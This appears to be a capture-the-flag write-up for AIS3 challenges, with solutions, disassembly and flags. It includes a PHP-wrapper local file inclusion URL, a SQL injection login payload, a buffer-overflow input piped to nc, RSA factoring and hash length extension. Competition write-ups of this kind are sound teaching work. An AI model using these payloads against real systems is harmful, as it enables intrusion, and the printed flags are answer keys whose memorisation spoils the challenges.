## misc-1

`The key is AIS3{hello_world}`

## misc-2

Use pkcrack to decrypt `key.txt`.

Here is the image:

![https://fbcdn-dragon-a.akamaihd.net/hphotos-ak-prn1/p960x960/851556_443281069111871_602278786_n.png](assets/851556_443281069111871_602278786_n.png)

``` sh
mkdir p960x960
curl https://fbcdn-dragon-a.akamaihd.net/hphotos-ak-prn1/p960x960/851556_443281069111871_602278786_n.png \
     -o p960x960/851556_443281069111871_602278786_n.png
zip fb_plain.zip p960x960/851556_443281069111871_602278786_n.png
pkcrack -C facebook.zip -c p960x960/851556_443281069111871_602278786_n.png \
        -P fb_plain.zip -p p960x960/851556_443281069111871_602278786_n.png \
        -d clean.zip -a
unzip clean.zip key.txt
```

## misc-3

c4 is a gzip compressed tarball and unpack it to get a bitmap file.

you will see some fuzzy words through fill tool and
use `hexdump c4.bmp` you will figure out a lot f all 0xff rows.

Here's a one-line solution:

``` sh
sed -i "s/\xff/\x00/g" b.bmp
```

![Cong, the key is AIS3{picture_in_picture_0xcc}](assets/c4-processed.bmp)

## web-1

There is a local file inclusion vulnerability:

`http://52.69.163.194/web1/?page=php://filter/convert.base64-encode/resource=index`

And you can see the flag in the comment of php code.

( @orangetw told me this :P )

The key is `AIS3{php_wrapper_rocks}`

## web-2

[JavaScript Deobfuscator](https://github.com/palant/jsdeobfuscator) plugin for Firefox is your friend.

![JavaScript Deobfuscator](assets/javascript-deobfuscator.png)

## web-3

Post payload is `username=root&password=\' or 1=1 #\`.

Don't ask me. I just fuzz it manually and I HATE WEB!

The key is `AIS3{wow_you_notice_the_little_difference} `

## bin-1

This is a packed PE with upx shell, but it was modified manually, so we can't just do `upx -d`.

You can just simply unpack it by
[this metohd](http://www.behindthefirewalls.com/2013/12/unpacking-upx-file-manually-with-ollydbg.html),
and you can analyze it now!

1. run it
2. open [Cheat Engine](http://cheatengine.org/)
3. scan string for `AIS3{` and you got the flag

## bin-2

This one is x64 shellcode.

``` sh
python2 -c "print \"$(tr -d '\r' < sc.txt | tr -d '\n')\"" | \
ndisasm -b64 -
```

```
// obviously, they are output content
00000000  48B8B5A3B9B1C641  mov rax,0x414141c6b1b9a3b5
         -4141
0000000A  50                push rax
0000000B  48B8BCA0A993AAA3  mov rax,0x93bea3aa93a9a0bc
         -BE93
00000015  50                push rax
00000016  48B8A993A5BF93BF  mov rax,0xa1a5bf93bfa593a9
         -A5A1
00000020  50                push rax
00000021  48B8BFA4A9A0A0AF  mov rax,0xa8a3afa0a0a9a4bf
         -A3A8
0000002B  50                push rax
0000002C  48B88D859FFFB7A3  mov rax,0x93a7a3b7ff9f858d
         -A793
00000036  50                push rax
00000037  4889E6            mov rsi,rsp
0000003A  4831D2            xor rdx,rdx
0000003D  803416CC          xor byte [rsi+rdx],0xcc // xor key
00000041  FEC2              inc dl
00000043  80FA25            cmp dl,0x25 // length
00000046  75F5              jnz 0x3d
00000048  4831C0            xor rax,rax
0000004B  48FFC0            inc rax
0000004E  4889C7            mov rdi,rax
00000051  0F05              syscall
00000053  6A3C              push byte +0x3c
00000055  58                pop rax
00000056  4831FF            xor rdi,rdi
00000059  0F05              syscall
0000005B  0A                db 0x0a

```

``` sh
python2 -c "print \"$(tr -d '\r' < sc.txt | tr -d '\n')\"" | \
ndisasm -b64 - | grep -o 'mov rax,\w\+' | \
tac | cut -b 11- | \
python2 -c 'import sys
data = sys.stdin.read().split()
data = map(lambda x: int(x, 16), data)
data = map(lambda x: x ^ 0xcccccccccccccccc, data)
data = map(lambda x: "%.16x" % x, data)
data = map(lambda x: x.decode("hex"), data)
data = map(lambda x: x[::-1], data)
print "".join(data)[:0x25]'
```

## bin-3

`start` initializes some register and flag, then jump to `jumper`. Actually, `jumper` is a strange main loop.

```
00000000004000b0 <_start>:
  4000b0:       48 c7 04 25 34 04 60    mov    QWORD PTR ds:0x600434,0x1 # jumper flag
  4000b7:       00 01 00 00 00
  4000bc:       48 be 70 02 60 00 00    movabs rsi,0x600270 # string: "Congraz! Th..."
  4000c3:       00 00 00
  4000c6:       48 31 c9                xor    rcx,rcx # counter = 0
  4000c9:       e9 82 01 00 00          jmp    400250 <jumper>
```

```
# jumper is main loop
0000000000400250 <jumper>:
  400250:       48 89 cf                mov    rdi,rcx
  # check if rdi(from rcx, counter) is a prime?
  400253:       e8 f2 fe ff ff          call   40014a <is_prime>
  # check jump flag
  400258:       48 3b 04 25 34 04 60    cmp    rax,QWORD PTR ds:0x600434
  40025f:       00
  400260:       74 09                   je     40026b <jumper+0x1b>
  400262:       8b 04 8d 57 03 60 00    mov    eax,DWORD PTR [rcx*4+0x600357]
  400269:       ff d0                   call   rax # execute the function
  40026b:       48 ff c1                inc    rcx # counter++
  40026e:       eb e0                   jmp    400250 <jumper>
```

`check0` is the first clue, xor all characters and the value should be `0x1b`

```
00000000006003dc <check0>:
  6003dc:       b8 00 00 00 00          mov    eax,0x0
  6003e1:       30 d0                   xor    al,dl
  6003e3:       48 c1 ea 08             shr    rdx,0x8
  6003e7:       30 d0                   xor    al,dl
  6003e9:       48 c1 ea 08             shr    rdx,0x8
  6003ed:       30 d0                   xor    al,dl
  6003ef:       48 c1 ea 08             shr    rdx,0x8
  6003f3:       30 d0                   xor    al,dl
  6003f5:       48 c1 ea 08             shr    rdx,0x8
  6003f9:       30 d0                   xor    al,dl
  6003fb:       48 c1 ea 08             shr    rdx,0x8
  6003ff:       30 d0                   xor    al,dl
  600401:       48 c1 ea 08             shr    rdx,0x8
  600405:       30 d0                   xor    al,dl
  600407:       48 c1 ea 08             shr    rdx,0x8
  60040b:       30 d0                   xor    al,dl
  60040d:       48 c1 ea 08             shr    rdx,0x8
  600411:       c7 04 25 5b 03 60 00    mov    DWORD PTR ds:0x60035b,0x4001b9 <check1>
  600418:       b9 01 40 00
  60041c:       3c 1b                   cmp    al,0x1b
  60041e:       74 12                   je     600432 <check0+0x56>
  600420:       c7 04 25 57 03 60 00    mov    DWORD PTR ds:0x600357,0x4001df <exit>
  600427:       df 01 40 00
  60042b:       48 c7 c1 ff ff ff ff    mov    rcx,0xffffffffffffffff
  600432:       c3                      ret
```

## pwn-1

### x86-64 calling convention (Linux)

See [wikipedia](https://en.wikipedia.org/wiki/X86_calling_conventions).

```
func(rdi, rsi, rdx, rcx, r8, r9, stack...)


func(0, 1, 2, 3, 4, 5, 6, 7);

mov rdi, 0
mov rsi, 1
mov rdx, 2
mov rcx, 3
mov r8, 4
mov r9, 5
push 6
push 7
call func


scanf(format_s, buffer);

mov rdi, format_s
mov rsi, buffer
call scanf
```

### Analyze

```
0040071a: lea    rax,[rbp-0x20]                    // buffer
0040071e: mov    rsi,rax
00400721: mov    edi,0x4007fa                      // "%s"
00400726: mov    eax,0x0
                                                   // we have a buffer overflow vulnerability here!
0040072b: call   4005b0 <__isoc99_scanf@plt>       // scanf("%s", buffer);
00400730: cmp    DWORD PTR [rbp-0x4],0x90909090    // overwrite target
00400737: jne    400745
00400739: mov    edi,0x601080
0040073e: call   400560 <puts@plt>                 // Key!!
00400743: jmp    400759
00400745: mov    eax,DWORD PTR [rbp-0x4]
00400748: mov    esi,eax
0040074a: mov    edi,0x400800                      // "Your point is only %d, try hard!\n"
0040074f: mov    eax,0x0
00400754: call   400570 <printf@plt>
00400759: leave
0040075a: ret
```

The stack structure:

| Offset   | Content       |
| -------- | ------------- |
| rbp - 20 | buffer        |
| rbp - 18 | buffer+08     |
| rbp - 10 | buffer+10     |
| rbp - 08 | [padding]     |
| rbp - 04 | points        |
| rbp      | [stack frame] |
| rbp + 08 | [ret address] |

So we need (24 + 4) bytes junk and 4bytes 0x90909090 to overwrite it.

``` sh
python2 -c 'print "A"*28 + "\x90"*4' | nc $HOST $PORT
```

The key is `AIS3{i_am_no_idea_what_to_write_qq}`

## pwn-2

TBA

The key is `AIS3{ok_now_you_are_the_beginner_of_buffer_overflow}`

## pwn-3

TBA

The key is `AIS3{5T4CK0V3RFL0W_15_0UR_900D_FR13ND}`

## crypto-1

File name is a hint, `google("vigenere");` and you will find
[Vigenère cipher](https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher) on Wikipedia and
[Vigenère Cipher Codebreaker](http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx).

Here is the first result:

```
Based on repetitions in the encrypted text, the most probable key length is 27 characters.

...

-- MESSAGE w/Key #1 = 'jbhpsxohfjbnpoboomjbnpsbohf' ----------------
thk vikenere cithek bs a method of etcrcpting althauxtic text by usong e series oj diyyerent caesar iiplers baseh on mae letters of a qeyaord. it is e sifile form of polealthabetic wublmitution.thoumh tle cipher ms etly to understatd ard implemint, yhr three centuxiew it resisxed tel attempts to hreek it. many teoiee have tried tu imtlement ercrrition schemes zhax are essertitely vigenere cophirs. congretuettions, the key os ir http://ctf.eis3.hkg/files/thekeeofzigenerelahtaa.txt

-- MESSAGE w/Key #2 = 'jbhpsxohfjbnpoboomjbnpsbohp' ----------------
thk vikenere cithek bs a method ef etcrcpting althauxtic text bo usong e series oj diyyerent caeiar iiplers baseh on mae letters ef a qeyaord. it is e sifile form of folealthabetic wublmitution.txoumh tle cipher ms etly to underitatd ard implemint, yhr three cedtuxiew it resisxed tel attempti to hreek it. many teoiee have triud tu imtlement ercrrition scheces zhax are essertitely vigenehe cophirs. congretuettions, the aey os ir http://ctf.eis3.hkg/files/thukeeofzigenerelahtaa.txt

-- MESSAGE w/Key #3 = 'jbhpsxohfjbnpoboomjbnpsbosf' ----------------
thk vikenere cithek bs a methos of etcrcpting althauxtic text qy usong e series oj diyyerent catsar iiplers baseh on mae letterh of a qeyaord. it is e sifile form ou polealthabetic wublmitution.ihoumh tle cipher ms etly to undegstatd ard implemint, yhr three ctntuxiew it resisxed tel attempis to hreek it. many teoiee have trxed tu imtlement ercrrition schtmes zhax are essertitely vigentre cophirs. congretuettions, tht key os ir http://ctf.eis3.hkg/files/twekeeofzigenerelahtaa.txt
```

It seems the key length is much shorter, so we try again with the key size option. (len = 9)

```
-- MESSAGE w/Key #1 = 'jbnpsbohf' ----------------
the vigenere cipher is a method of encrypting alphabetic text by using a series of different caesar ciphers based on the letters of a keyword. it is a simple form of polyalphabetic substitution.though the cipher is easy to understand and implement, for three centuries it resisted all attempts to break it. many people have tried to implement encryption schemes that are essentially vigenere ciphers. congratulations, the key is in http://ctf.ais3.org/files/thekeyofvigenerehahaha.txt
```

Also, we can write a little program to perform known-plaintext attack if you notice that the pattern of blank is same as first paragraph of [Wikipedia page](https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher). 

[assets/crypto1.py](assets/crypto1.py)

```
Original:
the vigenere cipher is a method of encrypting alphabetic text by
cir kahsujaf pxhisy nb b ztlick to farjzdanwh nahioijcjp iwyh id
Cleaned:
thevigenerecipherisamethodofencryptingalphabetictextbyusingaseri
cirkahsujafpxhisynbbztlicktofarjzdanwhnahioijcjpiwyhiddtvcybglwr
Key length is 9
Key is [9, 1, 13, 15, 18, 1, 14, 7, 5] // IAMORANGE
Decrypted:
the vigenere cipher is a method of encrypting alphabetic text by using a series of different caesar ciphers based on the letters of a keyword. it is a simple form of polyalphabetic substitution.

though the cipher is easy to understand and implement, for three centuries it resisted all attempts to break it. many people have tried to implement encryption schemes that are essentially vigenere ciphers. congratulations, the key is in http://ctf.ais3.org/files/thekeyofvigenerehahaha.txt
```

The key is `AIS3{i_am_scared_of_you}`

## crypto-2

[factordb](http://factordb.com/index.php?query=66473473500165594946611690873482355823120606837537154371392262259669981906291)
told you that
`N = 800644567978575682363895000391634967 * 83024947846700869393771322159348359271173`
and we need [rsatool](https://github.com/ius/rsatool) to calculate private exponent.

```
$ ./rsatool.py -p 800644567978575682363895000391634967 -q 83024947846700869393771322159348359271173
Using (p, q) to initialise RSA instance

n = 92f6a717a4ca87fbb4e008b2ba036d8fc5ca22c8bb61060fef170ce6792ec573
e = 65537 (0x10001)
d = 480c35d4888c65e8073f81e424ff42c28879294c3c4954a295bf3880decf0659
p = 800644567978575682363895000391634967 (0x9a32d32db1c5be9aeac5de0daa5017)
q = f3fd0751a4697130a74c96ce57bad29305
```

Solution:

``` python
import rsa

n = 66473473500165594946611690873482355823120606837537154371392262259669981906291
e = 65537
d = 0x480c35d4888c65e8073f81e424ff42c28879294c3c4954a295bf3880decf0659
p = 800644567978575682363895000391634967
q = 83024947846700869393771322159348359271173

private_key = rsa.PrivateKey(n, e, d, p, q)

data = open('flag.enc', 'r').read()
print rsa.decrypt(data, private_key)
```

## crypto-3

Using [HashPump](https://github.com/bwall/HashPump) to perform length extension attack.
And here is my [answer](assets/crypto3.py).

The key is `AIS3{give_me_mdfive}`
